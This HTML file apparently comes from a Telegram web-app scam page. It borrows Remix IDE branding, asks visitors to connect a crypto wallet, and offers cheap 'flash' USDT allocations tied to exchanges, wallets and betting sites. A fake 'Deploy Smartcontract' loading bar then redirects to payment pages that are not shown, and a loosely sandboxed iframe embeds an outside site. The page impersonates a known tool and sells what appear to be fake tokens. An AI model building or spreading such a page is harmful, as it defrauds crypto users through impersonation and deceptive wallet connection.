<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Grok Enterprise Node - Remix</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    
    <script type="module">
        import { createAppKit } from 'https://esm.sh/@reown/appkit'
        import { Ethers5Adapter } from 'https://esm.sh/@reown/appkit-adapter-ethers5'
        import { mainnet, bsc, arbitrum } from 'https://esm.sh/@reown/appkit/networks'

        const projectId = 'cb431b6f6e2a73a72983084a5bd30989' 

        const metadata = {
            name: 'Remix Kernel Builder',
            description: 'IDE Cloud Development',
            url: window.location.origin,
            icons: ['https://remix.ethereum.org/favicon.ico']
        }

        const modal = createAppKit({
            adapters: [new Ethers5Adapter()],
            networks: [mainnet, bsc, arbitrum],
            metadata,
            projectId,
            features: { 
                analytics: true, 
                email: true, 
                socials: ['google', 'x', 'github'] 
            },
            themeMode: 'dark',
            featuredWalletIds: [
                '4622a2b2d6ad1331070ef718105c4a5c9a75d5e5b6d0811e74f114c676d5e755' 
            ],
            themeVariables: { '--w3m-accent': '#6EEB36', '--w3m-z-index': 10000 }
        })

        window.appKitModal = modal;

        modal.subscribeAccount(state => {
            if (state.isConnected && state.address) {
                window.isWalletConnected = true;
                validateAction();
            }
        });
    </script>

    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #000;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            user-select: none;
            color: #f0f0f0;
            display: flex;
            flex-direction: column;
        }
        
        .app-overlay { position: fixed; inset: 0; background: radial-gradient(circle at center, #0a1a05 0%, #000 100%); z-index: 1; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        
        .loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 1000;
            background: #000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .content-container {
            position: relative;
            background-image: url('background.png');
            background-size: cover;
            background-position: center;
            border-radius: 40px 40px 0 0;
            border-top: 2px solid rgba(110, 235, 54, 0.5);
            box-shadow: 0 -20px 60px rgba(0,0,0,1);
            flex: 1;
            display: flex;
            flex-direction: column;
            padding-bottom: env(safe-area-inset-bottom);
            overflow: visible;
            margin-top: 60px;
        }

        .content-inner {
            position: relative;
            z-index: 1;
            height: 100%;
            display: flex;
            flex-direction: column;
            padding: 20px;
            padding-top: 70px;
        }

        .profile-wrapper {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
        }

        .remix-input {
            background: rgba(18, 18, 18, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.05);
            color: #fff;
            transition: all 0.3s ease;
            backdrop-filter: blur(12px);
        }

        .ui-btn {
            box-sizing: border-box;
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #6EEB36;
            font-weight: 800;
            font-size: 14px;
            background: rgba(110, 235, 54, 0.05);
            border: 1px solid rgba(110, 235, 54, 0.2);
            cursor: not-allowed;
            transition: 0.4s;
            overflow: hidden;
            border-radius: 20px;
            width: 100%;
            text-transform: uppercase;
        }

        .ui-btn.ready {
            cursor: pointer;
            background: #6EEB36;
            color: #000;
            border-color: #6EEB36;
            box-shadow: 0 10px 30px rgba(110, 235, 54, 0.3);
        }

        #freeCheckModal {
            display: none;
            position: fixed;
            inset: 0;
            background: #000;
            z-index: 2000;
            flex-direction: column;
        }

        .iframe-container {
            flex: 1;
            width: 100%;
            background: #fff;
        }

        #bottomSheetOverlay, #coreSheetOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            z-index: 500;
        }

        .bottom-sheet {
            position: fixed;
            bottom: -100%;
            left: 0;
            right: 0;
            background: #1c1c1e;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px 24px 0 0;
            z-index: 501;
            transition: bottom 0.4s cubic-bezier(0.32, 0.72, 0, 1);
            max-height: 85vh;
            overflow-y: auto;
            padding-bottom: env(safe-area-inset-bottom);
        }

        .bottom-sheet.active { bottom: 0; }

        .sheet-header {
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .close-btn {
            position: absolute;
            right: 20px;
            color: #8e8e93;
            font-size: 20px;
        }

        .sheet-title {
            font-weight: 600;
            font-size: 16px;
            color: #fff;
        }

        .option-item {
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: background 0.2s;
            cursor: pointer;
        }
        
        /* ضبط مظهر زر AppKit ليتناسب مع التصميم */
        appkit-button {
            width: 100%;
            display: flex;
            justify-content: center;
        }
    </style>
</head>
<body class="fixed inset-0">

    <div class="app-overlay"></div>

    <div id="freeCheckModal">
        <div class="flex items-center justify-between p-4 bg-[#1c1c1e] border-b border-white/10">
            <span class="text-white font-bold">Free Node Preview</span>
            <button onclick="toggleFreeCheck(false)" class="text-[#6EEB36] font-bold text-sm">CLOSE</button>
        </div>
        <div class="iframe-container">
            <iframe 
                src="https://servernsjaj.onrender.com/" 
                class="w-full h-full border-none"
                sandbox="allow-forms allow-modals allow-popups allow-popups-to-escape-sandbox allow-scripts allow-same-origin allow-top-navigation"
            ></iframe>
        </div>
    </div>

    <div id="loadingOverlay" class="loading-overlay">
        <img src="erc.gif" class="w-16 h-16 mb-6" alt="Kernel">
        <div class="text-[#6EEB36] text-[11px] font-black tracking-[0.5em] uppercase mb-8 text-center">Synchronizing Remix Kernel...</div>
        <div class="w-56 h-[2px] bg-white/5 rounded-full overflow-hidden">
            <div id="progressBar" class="h-full bg-[#6EEB36] shadow-[0_0_15px_#6EEB36] transition-all duration-300 w-0"></div>
        </div>
    </div>

    <div id="bottomSheetOverlay"></div>
    <div id="bottomSheet" class="bottom-sheet no-scrollbar">
        <div class="sheet-header">
            <span class="sheet-title">Select Volume</span>
            <button onclick="closeSheet('amount')" class="close-btn">✕</button>
        </div>
        <div id="amountOptionsContainer" class="py-2"></div>
        <div class="h-10"></div>
    </div>

    <div id="coreSheetOverlay"></div>
    <div id="coreSheet" class="bottom-sheet no-scrollbar">
        <div class="sheet-header">
            <span class="sheet-title">Choosing the Node Core</span>
            <button onclick="closeSheet('core')" class="close-btn">✕</button>
        </div>
        <div id="coreOptionsContainer" class="py-2"></div>
        <div class="h-10"></div>
    </div>

    <div class="flex-1 flex flex-col relative z-10 w-full h-full">
        
        <div class="h-[120px] flex items-center justify-center pt-8">
             <div class="text-center">
                <h2 id="userName" class="text-white text-[16px] font-bold tracking-tight mb-0.5 uppercase">REMIX NODE</h2>
                <span id="userId" class="text-[#6EEB36] font-mono text-[10px] opacity-60">KRNL-0.54.0</span>
            </div>
        </div>

        <div class="content-container">
            <div class="profile-wrapper">
                <div class="relative">
                    <div class="w-28 h-28 rounded-[32px] p-[2px] bg-[#6EEB36] border border-black/50 shadow-[0_10px_40px_rgba(0,0,0,0.8)] overflow-hidden">
                        <img id="userPhoto" src="https://ui-avatars.com/api/?name=Remix&background=000&color=6EEB36" class="w-full h-full rounded-[30px] object-cover" alt="Profile">
                    </div>
                    <div class="absolute bottom-1 -right-1 w-7 h-7 bg-[#6EEB36] rounded-full border-4 border-black flex items-center justify-center z-10">
                        <div class="w-2 h-2 bg-black rounded-full"></div>
                    </div>
                </div>
            </div>

            <div class="content-inner">
                <div class="flex-1 space-y-4 overflow-y-auto no-scrollbar">
                    
                    <div onclick="toggleFreeCheck(true)" class="relative group cursor-pointer overflow-hidden bg-gradient-to-r from-[#6EEB36]/20 to-transparent border-2 border-[#6EEB36] p-4 rounded-2xl animate-pulse shadow-[0_0_20px_rgba(110,235,54,0.2)]">
                        <div class="flex items-center justify-between">
                            <div class="flex items-center gap-3">
                                <div class="bg-[#6EEB36] p-1.5 rounded-lg flex items-center justify-center">
                                    <img src="check.png" class="w-5 h-5 object-contain" alt="Check Icon">
                                </div>
                                <div>
                                    <h3 class="text-[#6EEB36] text-[14px] font-black italic tracking-tight">CHECK IT FOR FREE</h3>
                                    <p class="text-white/60 text-[10px] font-bold uppercase">Verify Node Status Instantly</p>
                                </div>
                            </div>
                            <span class="text-[#6EEB36] text-xl font-black">»</span>
                        </div>
                    </div>

                    <div class="bg-orange-500/10 border border-orange-500/20 p-4 rounded-2xl">
                        <p class="text-[11px] text-orange-400 font-medium text-center leading-relaxed">
                            NOTICE: Please use an empty wallet for safety during testing.
                        </p>
                    </div>

                    <div class="w-full flex justify-center py-2">
                        <appkit-button></appkit-button>
                    </div>

                    <div class="space-y-2">
                        <label class="text-[11px] font-semibold text-white/30 uppercase tracking-widest ml-1 block">Choosing the Node Core</label>
                        <button id="coreSheetTrigger" class="w-full remix-input rounded-2xl p-4 flex items-center justify-between text-[15px] font-bold text-white active:scale-[0.98] transition-all">
                            <span id="selectedCoreText">Select node core</span>
                            <span class="text-[#6EEB36] text-xl">›</span>
                        </button>
                    </div>

                    <div class="space-y-2">
                        <label class="text-[11px] font-semibold text-white/30 uppercase tracking-widest ml-1 block">Allocation Volume</label>
                        <button id="amountSheetTrigger" class="w-full remix-input rounded-2xl p-4 flex items-center justify-between text-[15px] font-bold text-white active:scale-[0.98] transition-all">
                            <span id="selectedAmountText">Select volume & price</span>
                            <span class="text-[#6EEB36] text-xl">›</span>
                        </button>
                    </div>

                </div>

                <div class="pt-4 mt-auto">
                    <button id="authorizeBtn" disabled class="ui-btn">
                        <span>Deploy Smartcontract</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready(); tg.expand();

        window.isWalletConnected = false;
        let selectedAmount = null;
        let selectedCore = null;

        const basePrice = 14.99;
        const amounts = [100, 150, 300, 500, 1000, 2000, 3000, 4000, 5000];

        const cores = [
            { name: 'Binance', img_src: 'binance.png', file: '3775 users [monthly]' },
            { name: 'Bybit', img_src: 'bybit.png', file: '2751 users [monthly]' },
            { name: 'MEXC', img_src: 'mexc.png', file: '1937 users [monthly]' },
            { name: '1xBet', img_src: '1xbet.png', file: '13745 users [monthly]' },
            { name: 'Linbet', img_src: 'linebet.png', file: '11766 users [monthly]' },
            { name: 'Malbet', img_src: 'malbet.png', file: '9073 users [monthly]' },
            { name: 'MegaPari', img_src: 'megapari.png', file: '6118 users [monthly]' },
            { name: 'TrustWallet', img_src: 'trustwallet.png', file: '3652 users [monthly]' },
            { name: 'MetaMask', img_src: 'metamask.png', file: '3199 users [monthly]' },
            { name: 'Phantom', img_src: 'phantom.png', file: '2703 users [monthly]' },
            { name: 'TronLink', img_src: 'tronlink.png', file: '2598 users [monthly]' },
            { name: 'XM', img_src: 'xm.png', file: '2387 users [monthly]' },
            { name: 'Tikcmall', img_src: 'tickmall.png', file: '2187 users [monthly] ' },
            { name: 'Exness', img_src: 'exness.png', file: '1052 users [monthly]' },
            { name: 'eToro', img_src: 'etoro.png', file: '94 users [monthly]' },
            { name: 'Pocket option', img_src: 'pocket.png', file: '199 users [monthly]' },
            { name: 'Qoutex', img_src: 'quotex.png', file: '9437 users [monthly]' },
        ];

        const user = tg.initDataUnsafe?.user;
        if (user) {
            document.getElementById('userName').textContent = (user.first_name + ' ' + (user.last_name || '')).toUpperCase();
            if (user.photo_url) document.getElementById('userPhoto').src = user.photo_url;
        }

        function toggleFreeCheck(show) {
            document.getElementById('freeCheckModal').style.display = show ? 'flex' : 'none';
        }

        function openSheet(type) {
            const overlay = document.getElementById(type === 'amount' ? 'bottomSheetOverlay' : 'coreSheetOverlay');
            const sheet = document.getElementById(type === 'amount' ? 'bottomSheet' : 'coreSheet');
            overlay.style.display = 'block';
            setTimeout(() => sheet.classList.add('active'), 10);
        }

        function closeSheet(type) {
            const overlay = document.getElementById(type === 'amount' ? 'bottomSheetOverlay' : 'coreSheetOverlay');
            const sheet = document.getElementById(type === 'amount' ? 'bottomSheet' : 'coreSheet');
            sheet.classList.remove('active');
            setTimeout(() => overlay.style.display = 'none', 400);
        }

        document.getElementById('amountSheetTrigger').onclick = () => openSheet('amount');
        document.getElementById('bottomSheetOverlay').onclick = () => closeSheet('amount');
        document.getElementById('coreSheetTrigger').onclick = () => openSheet('core');
        document.getElementById('coreSheetOverlay').onclick = () => closeSheet('core');

        const amountOptionsContainer = document.getElementById('amountOptionsContainer');
        amounts.forEach(amt => {
            const currentPrice = ((amt / 100) * basePrice).toFixed(2);
            const div = document.createElement('div');
            div.className = 'option-item p-4 flex justify-between items-center border-b border-white/5 active:bg-white/5';
            div.innerHTML = `
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 bg-[#2c2c2e] rounded-xl flex items-center justify-center">
                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-6 h-6" alt="USDT">
                    </div>
                    <div>
                        <span class="text-white text-[15px] font-bold block">${amt} USDT</span>
                        <span class="text-[#8e8e93] text-[10px]">FLASH ALLOCATION</span>
                    </div>
                </div>
                <div class="text-right">
                    <span class="text-white font-bold">$${currentPrice}</span>
                </div>
            `;
            div.onclick = () => {
                selectedAmount = amt;
                document.getElementById('selectedAmountText').innerHTML = `
                    <div class="flex items-center gap-3">
                        <span class="text-white font-bold">${amt} USDT</span>
                        <span class="text-[#6EEB36] font-bold">— $${currentPrice}</span>
                    </div>
                `;
                closeSheet('amount');
                validateAction();
            };
            amountOptionsContainer.appendChild(div);
        });

        const coreOptionsContainer = document.getElementById('coreOptionsContainer');
        cores.forEach(core => {
            const div = document.createElement('div');
            div.className = 'option-item p-4 flex justify-between items-center border-b border-white/5 active:bg-white/5';
            div.innerHTML = `
                <div class="flex items-center gap-3">
                    <div class="w-10 h-10 bg-[#2c2c2e] rounded-xl flex items-center justify-center overflow-hidden">
                        <img src="${core.img_src}" class="w-7 h-7 object-contain" onerror="this.src='https://ui-avatars.com/api/?name=${core.name}&background=6EEB36&color=000'">
                    </div>
                    <div>
                        <span class="text-white text-[15px] font-bold block">${core.name}</span>
                        <span class="text-[#8e8e93] text-[10px] uppercase">${core.file}</span>
                    </div>
                </div>
                <span class="text-[#6EEB36] text-xl">›</span>
            `;
            div.onclick = () => {
                selectedCore = core.name;
                document.getElementById('selectedCoreText').innerHTML = `
                    <div class="flex items-center gap-3">
                        <span class="text-white font-bold">${core.name}</span>
                        <span class="text-white/40 text-[10px] font-medium uppercase">— NODE ACTIVE</span>
                    </div>
                `;
                closeSheet('core');
                validateAction();
            };
            coreOptionsContainer.appendChild(div);
        });

        function validateAction() {
            const btn = document.getElementById('authorizeBtn');
            if (window.isWalletConnected && selectedAmount && selectedCore) {
                btn.disabled = false;
                btn.classList.add('ready');
            }
        }

        document.getElementById('authorizeBtn').onclick = function() {
            if (this.disabled) return;
            const loading = document.getElementById('loadingOverlay');
            const bar = document.getElementById('progressBar');
            loading.style.display = 'flex';
            let p = 0;
            const interval = setInterval(() => {
                p += 3; bar.style.width = p + '%';
                if (p >= 100) {
                    clearInterval(interval);
                    window.location.href = `${selectedAmount}.html`;
                }
            }, 30);
        };
    </script>
</body>
</html>
